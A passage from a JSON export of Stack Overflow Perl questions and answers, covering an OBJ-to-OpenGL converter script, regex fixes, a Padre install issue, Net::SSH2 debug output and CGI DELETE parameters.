      : $numNormals\\n\";\n\n}\n\n\n# reads vertices into $xcoords[], $ycoords[], $zcoords[]\n\n#   where coordinates are moved and scaled according to\n\n#   $xcen, $ycen, $zcen and $scalefac\n\n# reads texture coords into $tx[], $ty[] \n\n#   where y coordinate is mirrowed\n\n# reads normals into $nx[], $ny[], $nz[]\n\n#   but does not normalize, see normalizeNormals()\n\n# reads faces and establishes lookup data where\n\n#   va_idx[], vb_idx[], vc_idx[] for vertices\n\n#   ta_idx[], tb_idx[], tc_idx[] for texture coords\n\n#   na_idx[], nb_idx[], nc_idx[] for normals\n\n#   store indizes for the former arrays respectively\n\n#   also, $face_line[] store actual face string\n\nsub loadData {\n$numVerts = 0;\n$numFaces = 0;\n$numTexture = 0;\n$numNormals = 0;\n\nopen ( INFILE, \"&lt;$inFilename\" )\n  || die \"Can't find file $inFilename...exiting \\n\";\n\nwhile ($line = &lt;INFILE&gt;) \n{\n  chop $line;\n\n  # vertices\n  if ($line =~ /v\\s+.*/)\n  {\n    @tokens= split(' ', $line);\n    $x = ( $tokens[1] - $xcen ) * $scalefac;\n    $y = ( $tokens[2] - $ycen ) * $scalefac;\n    $z = ( $tokens[3] - $zcen ) * $scalefac;    \n    $xcoords[$numVerts] = $x; \n    $ycoords[$numVerts] = $y;\n    $zcoords[$numVerts] = $z;\n\n    $numVerts++;\n  }\n\n  # texture coords\n  if ($line =~ /vt\\s+.*/)\n  {\n    @tokens= split(' ', $line);\n    $x = $tokens[1];\n    $y = 1 - $tokens[2];\n    $tx[$numTexture] = $x;\n    $ty[$numTexture] = $y;\n\n    $numTexture++;\n  }\n\n  #normals\n  if ($line =~ /vn\\s+.*/)\n  {\n    @tokens= split(' ', $line);\n    $x = $tokens[1];\n    $y = $tokens[2];\n    $z = $tokens[3];\n    $nx[$numNormals] = $x; \n    $ny[$numNormals] = $y;\n    $nz[$numNormals] = $z;\n\n    $numNormals++;\n  }\n\n  # faces\n  if ($line =~ /f\\s+([^ ]+)\\s+([^ ]+)\\s+([^ ]+)(\\s+([^ ]+))?/) \n  {\n    @a = split('/', $1);\n    @b = split('/', $2);\n    @c = split('/', $3);\n    $va_idx[$numFaces] = $a[0]-1;\n    $ta_idx[$numFaces] = $a[1]-1;\n    $na_idx[$numFaces] = $a[2]-1;\n\n    $vb_idx[$numFaces] = $b[0]-1;\n    $tb_idx[$numFaces] = $b[1]-1;\n    $nb_idx[$numFaces] = $b[2]-1;\n\n    $vc_idx[$numFaces] = $c[0]-1;\n    $tc_idx[$numFaces] = $c[1]-1;\n    $nc_idx[$numFaces] = $c[2]-1;\n\n    $face_line[$numFaces] = $line;\n\n    $numFaces++;\n\n    # ractangle =&gt; second triangle\n    if($5 != \"\")\n    {\n        @d = split('/', $5);\n        $va_idx[$numFaces] = $a[0]-1;\n        $ta_idx[$numFaces] = $a[1]-1;\n        $na_idx[$numFaces] = $a[2]-1;\n\n        $vb_idx[$numFaces] = $d[0]-1;\n        $tb_idx[$numFaces] = $d[1]-1;\n        $nb_idx[$numFaces] = $d[2]-1;\n\n        $vc_idx[$numFaces] = $c[0]-1;\n        $tc_idx[$numFaces] = $c[1]-1;\n        $nc_idx[$numFaces] = $c[2]-1;\n\n        $face_line[$numFaces] = $line;\n\n        $numFaces++;\n    }\n\n  }  \n}\n\nclose INFILE;\n\n}\n\n\nsub normalizeNormals {\nfor ( $j = 0; $j &lt; $numNormals; ++$j) \n{\n $d = sqrt ( $nx[$j]*$nx[$j] + $ny[$j]*$ny[$j] + $nz[$j]*$nz[$j] );\n\n  if ( $d == 0 )\n  {\n    $nx[$j] = 1;\n    $ny[$j] = 0;\n    $nz[$j] = 0;\n  }\n  else\n  {\n    $nx[$j] = $nx[$j] / $d;\n    $ny[$j] = $ny[$j] / $d;\n    $nz[$j] = $nz[$j] / $d;\n  }\n\n}\n\n}\n\n\nsub fixedIndex {\nlocal $idx = $_[0];\nlocal $num = $_[1];\nif($idx &gt;= 0)\n{\n    $idx;\n} else {\n    $num + $idx + 1;\n}\n\n}\n\n\nsub writeOutput {\nopen ( OUTFILE, \"&gt;$outFilename\" ) \n  || die \"Can't create file $outFilename ... exiting\\n\";\n\nprint OUTFILE \"/*\\n\";\nprint OUTFILE \"created with obj2opengl.pl\\n\\n\";\n\n# some statistics\nprint OUTFILE \"source file    : $inFilename\\n\";\nprint OUTFILE \"vertices       : $numVerts\\n\";\nprint OUTFILE \"faces          : $numFaces\\n\";\nprint OUTFILE \"normals        : $numNormals\\n\";\nprint OUTFILE \"texture coords : $numTexture\\n\";\nprint OUTFILE \"\\n\\n\";\n\n# example usage\nprint OUTFILE \"// include generated arrays\\n\";\nprint OUTFILE \"#import \\\"\".$outFilename.\"\\\"\\n\";\nprint OUTFILE \"\\n\";\nprint OUTFILE \"// set input data to arrays\\n\";\nprint OUTFILE \"glVertexPointer(3, GL_FLOAT, 0, \".$object.\"Verts);\\n\";\nprint OUTFILE \"glNormalPointer(GL_FLOAT, 0, \".$object.\"Normals);\\n\"\n    if $numNormals &gt; 0;\nprint OUTFILE \"glTexCoordPointer(2, GL_FLOAT, 0, \".$object.\"TexCoords);\\n\"\n    if $numTexture &gt; 0;\nprint OUTFILE \"\\n\";\nprint OUTFILE \"// draw data\\n\";\nprint OUTFILE \"glDrawArrays(GL_TRIANGLES, 0, \".$object.\"NumVerts);\\n\";\nprint OUTFILE \"*/\\n\\n\";\n\n# needed constant for glDrawArrays\nprint OUTFILE \"unsigned int \".$object.\"NumVerts = \".($numFaces * 3).\";\\n\\n\";\n\n# write verts\nprint OUTFILE \"float \".$object.\"Verts \\[\\] = {\\n\"; \nfor( $j = 0; $j &lt; $numFaces; $j++)\n{\n    $ia = fixedIndex($va_idx[$j], $numVerts);\n    $ib = fixedIndex($vb_idx[$j], $numVerts);\n    $ic = fixedIndex($vc_idx[$j], $numVerts);\n    print OUTFILE \"  // $face_line[$j]\\n\";\n    print OUTFILE \"  $xcoords[$ia], $ycoords[$ia], $zcoords[$ia],\\n\";\n    print OUTFILE \"  $xcoords[$ib], $ycoords[$ib], $zcoords[$ib],\\n\";\n    print OUTFILE \"  $xcoords[$ic], $ycoords[$ic], $zcoords[$ic],\\n\";\n}\nprint OUTFILE \"};\\n\\n\";\n\n# write normals\nif($numNormals &gt; 0) {\n    print OUTFILE \"float \".$object.\"Normals \\[\\] = {\\n\"; \n    for( $j = 0; $j &lt; $numFaces; $j++) {\n        $ia = fixedIndex($na_idx[$j], $numNormals);\n        $ib = fixedIndex($nb_idx[$j], $numNormals);\n        $ic = fixedIndex($nc_idx[$j], $numNormals);\n        print OUTFILE \"  // $face_line[$j]\\n\";\n        print OUTFILE \"  $nx[$ia], $ny[$ia], $nz[$ia],\\n\";\n        print OUTFILE \"  $nx[$ib], $ny[$ib], $nz[$ib],\\n\";\n        print OUTFILE \"  $nx[$ic], $ny[$ic], $nz[$ic],\\n\";\n    }\n\n    print OUTFILE \"};\\n\\n\";\n}\n\n# write texture coords\nif($numTexture) {\n    print OUTFILE \"float \".$object.\"TexCoords \\[\\] = {\\n\"; \n    for( $j = 0; $j &lt; $numFaces; $j++) {\n        $ia = fixedIndex($ta_idx[$j], $numTexture);\n        $ib = fixedIndex($tb_idx[$j], $numTexture);\n        $ic = fixedIndex($tc_idx[$j], $numTexture);\n        print OUTFILE \"  // $face_line[$j]\\n\";\n        print OUTFILE \"  $tx[$ia], $ty[$ia],\\n\";\n        print OUTFILE \"  $tx[$ib], $ty[$ib],\\n\";\n        print OUTFILE \"  $tx[$ic], $ty[$ic],\\n\";\n    }\n\n    print OUTFILE \"};\\n\\n\";\n}\n\nclose OUTFILE;\n\n}\n</code></pre>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "edited": false, "score": 1, "creation_date": 1485953428, "post_id": 41980158, "comment_id": 71137997, "body": "<code>$value =~ s&#47;\\sdata-bind=&quot;.*?&quot;&#47;&#47;gs;</code>"}, {"owner": {"reputation": 917, "user_id": 3014263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rFh51.jpg?s=128&g=1", "display_name": "AbhiNickz", "link": "https://stackoverflow.com/users/3014263/abhinickz"}, "reply_to_user": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "edited": false, "score": 0, "creation_date": 1485953482, "post_id": 41980158, "comment_id": 71138041, "body": "<code>.</code> refer to any character except newline. @ssr1012 answered with regex that works for your case. with <code>s</code> flag <code>.</code> matches newline."}, {"owner": {"reputation": 82895, "user_id": 372239, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/2twLb.jpg?s=128&g=1", "display_name": "Toto", "link": "https://stackoverflow.com/users/372239/toto"}, "edited": false, "score": 0, "creation_date": 1485954107, "post_id": 41980158, "comment_id": 71138430, "body": "Don&#39;t parse HTML with regex. Use a parser, you&#39;ll find many on CPAN."}], "answers": [{"tags": [], "owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "is_accepted": false, "score": 1, "last_activity_date": 1485953694, "creation_date": 1485953694, "answer_id": 41980361, "question_id": 41980158, "link": "https://stackoverflow.com/questions/41980158/how-to-extend-my-perl-regular-expression-to-remove-matching-pattern-even-if-ther/41980361#41980361", "title": "how to extend my Perl regular expression to remove matching pattern even if there is a line break in between", "body": "<pre><code>my $str = \"&lt;p data-bind=\\\"XYZ\\\" style=\\\"text-align: center;\\\"&gt;Untitled Template1 - art&lt;/p&gt;\n&lt;p&gt;&lt;select data-bind=\\\"\n        options:options,\n        optionsText: 'value',\n        optionsValue: 'id',\n        value: value,\n        optionsCaption:'Please select',\n        attr: { id: 'select'+id }\\\"&gt;&lt;option style=\\\"text-align: center;\\\" value=\\\"8661\\\"&gt;&lt;/option&gt;&lt;option value=\\\"8662\\\"&gt;&lt;/option&gt;&lt;/select&gt;&lt;/p&gt;\";\n</code></pre>\n\n<blockquote>\n  <p>If you are using in the multi-line replacement it should be use <code>s</code> modifier.</p>\n</blockquote>\n\n<pre><code>    $str=~s/\\sdata-bind=\".*?\"//gs;\n\n    print $str;\n</code></pre>\n"}], "owner": {"reputation": 344, "user_id": 1254174, "user_type": "registered", "accept_rate": 41, "profile_image": "https://www.gravatar.com/avatar/2416cff2f4d8dd65a5bf52228d86208a?s=128&d=identicon&r=PG", "display_name": "Ash_and_Perl", "link": "https://stackoverflow.com/users/1254174/ash-and-perl"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 39, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1485953694, "creation_date": 1485953018, "last_edit_date": 1495542812, "question_id": 41980158, "link": "https://stackoverflow.com/questions/41980158/how-to-extend-my-perl-regular-expression-to-remove-matching-pattern-even-if-ther", "title": "how to extend my Perl regular expression to remove matching pattern even if there is a line break in between", "body": "<p>I am facing problem in writing a generic regular expression which will help me clean up the unwanted HTML attributes from my input text.\nMy input looks like this</p>\n\n<pre><code>&lt;p data-bind=\"XYZ\" style=\"text-align: center;\"&gt;Untitled Template1 - art&lt;/p&gt;\n&lt;p&gt;&lt;select data-bind=\"\n            options:options,\n            optionsText: 'value',\n            optionsValue: 'id',\n            value: value,\n            optionsCaption:'Please select',\n            attr: { id: 'select'+id }\"&gt;&lt;option style=\"text-align: center;\" value=\"8661\"&gt;&lt;/option&gt;&lt;option value=\"8662\"&gt;&lt;/option&gt;&lt;/select&gt;&lt;/p&gt;\n</code></pre>\n\n<p>I have pushed both of these strings into an array. I am looping the array and clearing the <code>data-bind</code> attribute.</p>\n\n<pre><code>foreach my $row ( @$results ) {\n    $value =~ s/\\sdata-bind=\".*?\"//g;\n}\n</code></pre>\n\n<p>Result looks like this:</p>\n\n<pre><code>&lt;p style=\"text-align: center;\"&gt;Untitled Template1 - art&lt;/p&gt;\n&lt;p&gt;&lt;select data-bind=\"\n            options:options,\n            optionsText: 'value',\n            optionsValue: 'id',\n            value: value,\n            optionsCaption:'Please select',\n            attr: { id: 'select'+id }\"&gt;&lt;option style=\"text-align: center;\" value=\"8661\"&gt;&lt;/option&gt;&lt;option value=\"8662\"&gt;&lt;/option&gt;&lt;/select&gt;&lt;/p&gt;\n</code></pre>\n\n<p>How to eliminate <code>data-bind</code> attribute from my second string. Can any one help.\nI searched Stackoverflow and found a user asking the same <a href=\"https://stackoverflow.com/questions/2962204/can-regex-match-be-based-on-two-lines-of-text\">question</a>. The answer mentioned in the above line states that regular expression can span more than one line but that isn't happening in my case.</p>\n"}, {"tags": ["perl", "strawberry-perl", "activeperl"], "answers": [{"comments": [{"owner": {"reputation": 588, "user_id": 6897492, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/d50889f9fb83f9a62eaec9df63aeb726?s=128&d=identicon&r=PG&f=1", "display_name": "Mohit", "link": "https://stackoverflow.com/users/6897492/mohit"}, "edited": false, "score": 0, "creation_date": 1486010870, "post_id": 41985354, "comment_id": 71165685, "body": "Reinstalling does not solves the problem, I don&#39;t want to install Komodo IDE, I want Padre and Strawberry Perl. It seems than in the end part of installing the script executes some command on command prompt but as ActivePerl is already installed, that command might be not going to the Strawberry Perl. I&#39;ll try different things to see if the problem can be resolved."}], "tags": [], "owner": {"reputation": 31, "user_id": 6895650, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-ivqj7qbY2sQ/AAAAAAAAAAI/AAAAAAAAABM/KjPDfO8Mn_s/photo.jpg?sz=128", "display_name": "Tom Radcliffe", "link": "https://stackoverflow.com/users/6895650/tom-radcliffe"}, "is_accepted": false, "score": 0, "last_activity_date": 1485968231, "creation_date": 1485968231, "answer_id": 41985354, "question_id": 41979409, "link": "https://stackoverflow.com/questions/41979409/dwim-not-installing-when-activeperl-present/41985354#41985354", "title": "DWIM not installing when ActivePerl present", "body": "<p>This looks like a Padre problem rather than anything specific to your Perl install(s). Try uninstalling/reinstalling Padre... or try uninstalling Padre and installing Komodo: <a href=\"http://www.activestate.com/komodo-ide\" rel=\"nofollow noreferrer\">http://www.activestate.com/komodo-ide</a> :-)</p>\n"}], "owner": {"reputation": 588, "user_id": 6897492, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/d50889f9fb83f9a62eaec9df63aeb726?s=128&d=identicon&r=PG&f=1", "display_name": "Mohit", "link": "https://stackoverflow.com/users/6897492/mohit"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 34, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1485968231, "creation_date": 1485950795, "question_id": 41979409, "link": "https://stackoverflow.com/questions/41979409/dwim-not-installing-when-activeperl-present", "title": "DWIM not installing when ActivePerl present", "body": "<p>I have ActivePerl already installed but when now I am trying to install DWIM package, it is not openeing. Its installed but whenever I try to open the Padre IDE it gives the below error.</p>\n\n<p><a href=\"https://i.stack.imgur.com/x1nv5.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/x1nv5.png\" alt=\"enter image description here\"></a>.</p>\n\n<p>I read that we can have two Perl versions - ActivePerl and Strawberry Perl on the same system due to separate paths for them. This popup also came while installing while a command prompt window got open and then this popped up. </p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 917, "user_id": 3014263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rFh51.jpg?s=128&g=1", "display_name": "AbhiNickz", "link": "https://stackoverflow.com/users/3014263/abhinickz"}, "edited": false, "score": 0, "creation_date": 1485950541, "post_id": 41979274, "comment_id": 71136144, "body": "You want to get the count of duplicate link? Could you please be specific &amp;  update your question with more details?"}, {"owner": {"reputation": 6351, "user_id": 3498962, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9tW.jpg?s=128&g=1", "display_name": "Essex Boy", "link": "https://stackoverflow.com/users/3498962/essex-boy"}, "edited": false, "score": 0, "creation_date": 1485951977, "post_id": 41979274, "comment_id": 71137110, "body": "perl -e &#39;undef $/;$content=&lt;ARGV&gt;;$count=0;while($content=~/http/g){$count+&zwnj;&#8203;+;}print &quot;$count\\n&quot;;&#39; test"}, {"owner": {"reputation": 82895, "user_id": 372239, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/2twLb.jpg?s=128&g=1", "display_name": "Toto", "link": "https://stackoverflow.com/users/372239/toto"}, "edited": false, "score": 0, "creation_date": 1485953359, "post_id": 41979274, "comment_id": 71137947, "body": "<code>perl -00 -nE &#39;@x = $_=~ &#47;\\bhtml\\b&#47;ig;say scalar@x;&#39; file.txt</code>"}, {"owner": {"reputation": 1837, "user_id": 432992, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/56873156f1a55b2a48e53f42af2b11b2?s=128&d=identicon&r=PG", "display_name": "Kerridge0", "link": "https://stackoverflow.com/users/432992/kerridge0"}, "reply_to_user": {"reputation": 917, "user_id": 3014263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rFh51.jpg?s=128&g=1", "display_name": "AbhiNickz", "link": "https://stackoverflow.com/users/3014263/abhinickz"}, "edited": false, "score": 0, "creation_date": 1485962258, "post_id": 41979274, "comment_id": 71144191, "body": "@AbhiNickz I made a typo at the beginning I should have written &#39;http&#39;. The answer below was what I was looking for thanks."}], "answers": [{"comments": [{"owner": {"reputation": 1837, "user_id": 432992, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/56873156f1a55b2a48e53f42af2b11b2?s=128&d=identicon&r=PG", "display_name": "Kerridge0", "link": "https://stackoverflow.com/users/432992/kerridge0"}, "edited": false, "score": 0, "creation_date": 1485962071, "post_id": 41980616, "comment_id": 71144061, "body": "Many thanks that&#39;s exactly what I wanted couldn&#39;t find it anywhere,. Will run some tests and accept in a while."}], "tags": [], "owner": {"reputation": 2092, "user_id": 2678168, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd5a048ca5e77e9683d0197b5455b3a9?s=128&d=identicon&r=PG&f=1", "display_name": "Georg Mavridis", "link": "https://stackoverflow.com/users/2678168/georg-mavridis"}, "is_accepted": false, "score": 2, "last_activity_date": 1485954479, "creation_date": 1485954479, "answer_id": 41980616, "question_id": 41979274, "link": "https://stackoverflow.com/questions/41979274/match-a-specific-number-of-occurences-of-a-string/41980616#41980616", "title": "Match a specific number of occurences of a string", "body": "<p>You have to group your search and use it 4 times.\nE.g.</p>\n\n<pre><code>/(http.*){4}/s\n</code></pre>\n\n<p>matches if the term http is included at least 4 times.</p>\n\n<p>The s modifier at the end would ensure that .* also matches newlines</p>\n"}], "owner": {"reputation": 1837, "user_id": 432992, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/56873156f1a55b2a48e53f42af2b11b2?s=128&d=identicon&r=PG", "display_name": "Kerridge0", "link": "https://stackoverflow.com/users/432992/kerridge0"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 48, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1485962143, "creation_date": 1485950383, "last_edit_date": 1485962143, "question_id": 41979274, "link": "https://stackoverflow.com/questions/41979274/match-a-specific-number-of-occurences-of-a-string", "title": "Match a specific number of occurences of a string", "body": "<p>I'd like to check a page source to basically check the number of occurrences of the word 'http' hasn't changed as a basic way of confirming that the page source hasn't been modified.</p>\n\n<p>for example I'd like to test the following source and match the fact that http has come up 4 times</p>\n\n<pre><code>&lt;html&gt;the following page http://example.com/a \n\ndescribes links that can also be found \nhere, &lt;a href=\"http://example.com/a\"&gt; here: http://example.com/a &lt;/a&gt; and http://example.com/a \n&lt;/html&gt;\n</code></pre>\n\n<p>What's an example regex that would match the four occurrences of http?</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 481636, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "edited": false, "score": 4, "creation_date": 1485948593, "post_id": 41978669, "comment_id": 71134850, "body": "Because the <code>[A-z]</code> range matches it."}, {"owner": {"reputation": 3751, "user_id": 3982001, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rX1ss.png?s=128&g=1", "display_name": "Fabio says Reinstate Monica", "link": "https://stackoverflow.com/users/3982001/fabio-says-reinstate-monica"}, "edited": false, "score": 3, "creation_date": 1485948864, "post_id": 41978669, "comment_id": 71135026, "body": "In other words, you have a typo: what you want is <code>[0-9a-zA-Z]</code>. The second <code>Z</code> must be uppercase. Ironically, you wrote it correctly in the question&#39;s title."}, {"owner": {"reputation": 33, "user_id": 2729433, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/BOUlz.jpg?s=128&g=1", "display_name": "MDot", "link": "https://stackoverflow.com/users/2729433/mdot"}, "edited": false, "score": 0, "creation_date": 1485953247, "post_id": 41978669, "comment_id": 71137881, "body": "got it . It was meant to be [0-9a-zA-Z] but I mistype the second z as lowercase. Thank you so much!!!"}], "owner": {"reputation": 33, "user_id": 2729433, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/BOUlz.jpg?s=128&g=1", "display_name": "MDot", "link": "https://stackoverflow.com/users/2729433/mdot"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 58, "favorite_count": 0, "closed_date": 1485948566, "answer_count": 0, "score": 0, "last_activity_date": 1485948640, "creation_date": 1485948506, "last_edit_date": 1485948640, "question_id": 41978669, "link": "https://stackoverflow.com/questions/41978669/why-does-perl-5-x-matches-an-underscore-with-0-9a-za-z", "closed_reason": "Duplicate", "title": "Why does perl 5.x matches an underscore with [0-9a-zA-Z]?", "body": "<p>In the following code:</p>\n\n<pre><code>my $s=\"_\";  \nif ( $s =~ /[0-9a-zA-z]/  ) {\n      print \" $s contains [0-9a-zA-z] \\n\";\n}\n</code></pre>\n\n<p>I'm getting as result </p>\n\n<pre><code> _ contains [0-9a-zA-z]\n</code></pre>\n\n<p>Why is underscore considered as part of this character class?</p>\n\n<p>I've tried with both 5.8.8 and 5.16.3 (on 64bit RHEL 6.8/7.3 respectively)</p>\n"}, {"tags": ["perl", "perlnetssh"], "comments": [{"owner": {"reputation": 917, "user_id": 3014263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rFh51.jpg?s=128&g=1", "display_name": "AbhiNickz", "link": "https://stackoverflow.com/users/3014263/abhinickz"}, "edited": false, "score": 0, "creation_date": 1485947428, "post_id": 41978152, "comment_id": 71134155, "body": "Run this code without this line <code>$ssh2-&gt;debug(1);</code>, I guess this is printing your unwanted data."}, {"owner": {"reputation": 61, "user_id": 4382896, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-6wue3LfQSTE/AAAAAAAAAAI/AAAAAAAAABc/DY5VpL9fcR0/photo.jpg?sz=128", "display_name": "Vsreddy", "link": "https://stackoverflow.com/users/4382896/vsreddy"}, "reply_to_user": {"reputation": 917, "user_id": 3014263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rFh51.jpg?s=128&g=1", "display_name": "AbhiNickz", "link": "https://stackoverflow.com/users/3014263/abhinickz"}, "edited": false, "score": 0, "creation_date": 1485947944, "post_id": 41978152, "comment_id": 71134470, "body": "You are correct AbhiNickz $ssh2-&gt;debug(1) is actually printing that stuff. I changed that to $ssh-&gt;debug(0) and now it is working fine. Thankyou."}], "answers": [{"tags": [], "owner": {"reputation": 61, "user_id": 4382896, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-6wue3LfQSTE/AAAAAAAAAAI/AAAAAAAAABc/DY5VpL9fcR0/photo.jpg?sz=128", "display_name": "Vsreddy", "link": "https://stackoverflow.com/users/4382896/vsreddy"}, "is_accepted": true, "score": 1, "last_activity_date": 1485948024, "creation_date": 1485948024, "answer_id": 41978509, "question_id": 41978152, "link": "https://stackoverflow.com/questions/41978152/stop-netssh2-from-printing-unwanted-data/41978509#41978509", "title": "Stop NET::SSH2 from printing unwanted data", "body": "<p>Changed <code>$ssh2-&gt;debug(1);</code> to <code>$ssh2-&gt;debug(0);</code>and now its printing all appropriate data.</p>\n"}], "owner": {"reputation": 61, "user_id": 4382896, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-6wue3LfQSTE/AAAAAAAAAAI/AAAAAAAAABc/DY5VpL9fcR0/photo.jpg?sz=128", "display_name": "Vsreddy", "link": "https://stackoverflow.com/users/4382896/vsreddy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 75, "favorite_count": 0, "accepted_answer_id": 41978509, "answer_count": 1, "score": 0, "last_activity_date": 1485948024, "creation_date": 1485947042, "question_id": 41978152, "link": "https://stackoverflow.com/questions/41978152/stop-netssh2-from-printing-unwanted-data", "title": "Stop NET::SSH2 from printing unwanted data", "body": "<p>I am trying to use NET::SSH to execute a command in a remote Ubuntu system from perl.I got the desired output but along with it the script is printing lots of unwanted data.How can we stop it. Thanks in advance.</p>\n\n<p>Here is the sample unwanted data (same this is getting printed hundreds of times for each execution).</p>\n\n<pre><code>Net::SSH2::Channel::read(size = 1, ext = 0)\n- read 1 bytes\n- read 1 total Net::SSH2::poll: timeout = 250, array[1]\n- [0] = channel\n- [0] events 1\n- libssh2_poll returned 1\n- [0] revents 1 Net::SSH2::Channel::read(size = 1, ext = 0)\n- read 1 bytes\n- read 1 total Net::SSH2::poll: timeout = 250, array[1]\n- [0] = channel\n- [0] events 1\n- libssh2_poll returned 1\n- [0] revents 1 Net::SSH2::Channel::read(size = 1, ext = 0)\n- read 1 bytes\n- read 1 total\n</code></pre>\n\n<p>And my code is</p>\n\n<pre><code>use warnings;\nuse strict;\nuse NET::SSH2;\nuse Data::Dumper;\nmy $auth;\nsub is_sshalive;\n\nmy $host = \"\";               # use the ip host to connect\nmy $user = \"ubuntu\"; # your account\nmy $cmd;\nmy $ssh2 = Net::SSH2-&gt;new();\n$ssh2-&gt;debug(1);\n$ssh2-&gt;connect($host,\"22\") or die \"connect failed\";\n$ssh2-&gt;auth_publickey(\n       'ubuntu',\n       'publickey',\n       'privatekey'\n\n    ) or die \"auth failed\";\n\n\n        print \"\\n Executing command...\\n\";\n\n        $cmd = \"ls -al\";\n        print \" ==&gt; Running $cmd\\n\";\n\n        if(is_sshalive($ssh2) == 1) {\n                print \"\\nSSH connection died\";\n                exit 1;\n        } else {\n\n         run_testsuite($cmd, $ssh2);\n        # echo $ssh2-&gt;exec(\"ls\");\n\n        }\n\nprint \"test passed done 0\\n\";\n\n\nsub run_testsuite {\n    my $cmd = $_[0];\n    my $ssh2 = $_[1];\n\n\n    my $chan2 = $ssh2-&gt;channel();\n    $chan2-&gt;shell();\n    my @arr;\n    print $chan2 \"$cmd \\n\";\n    print $chan2 \"pwd \\n\";\n    push @arr,$_  while &lt;$chan2&gt;;\n    print @arr;\n\n\n    $chan2-&gt;close;\n    return 0;\n}\n\nsub is_sshalive {\n   my $ssh2 = $_[0];\n    print \"isalive-shiva\";\n    if ($ssh2-&gt;poll(1000) == 0) {\n        return 0; # passed\n    } else {\n        return 1; #failed\n    }\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["perl", "parameters", "cgi", "http-delete"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 4, "creation_date": 1485946323, "post_id": 41977839, "comment_id": 71133413, "body": "Are you in general using the CGI module? Creating a new instance for every method you want to use seems... wasteful."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1485946400, "post_id": 41977839, "comment_id": 71133468, "body": "Related: <a href=\"http://stackoverflow.com/q/299628/1331451\">Is an entity body allowed for an HTTP DELETE request?</a>"}, {"owner": {"user_type": "does_not_exist", "display_name": "user7445564"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485946695, "post_id": 41977839, "comment_id": 71133665, "body": "Yes I&#39;m using it general. I&#39;m not creating new instance for every method, this is just for example here."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1485946765, "post_id": 41977839, "comment_id": 71133714, "body": "I don&#39;t think CGI.pm can do that. <a href=\"https://metacpan.org/source/LEEJO/CGI-4.35/lib/CGI.pm#L641\" rel=\"nofollow noreferrer\">According to this piece of code</a> it looks like only PUT and POST are supported. It also seems to be hard to monkeypatch that in."}, {"owner": 